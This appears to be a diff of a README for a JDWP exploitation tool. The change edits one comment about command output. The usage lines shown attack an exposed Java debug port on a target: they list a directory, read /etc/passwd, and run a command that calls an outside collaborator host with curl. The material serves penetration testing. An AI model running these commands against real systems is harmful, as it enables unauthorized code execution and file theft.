@@ -25,7 +25,7 @@ python3 jdwp-knife.py -t <target ip> -p 5005 --ls /app
 # Read file
 python3 jdwp-knife.py -t <target ip> -p 5005 --cat /etc/passwd
 
-# Fire-and-forget command execution (no stdout capture)
+# Command execution, it can write the stdout to the console (no need to exfiltrate data)
 python3 jdwp-knife.py -t <target ip> -p 5005 --cmd "curl http://collaborator.oastify.com"
 
 # Combine multiple operations
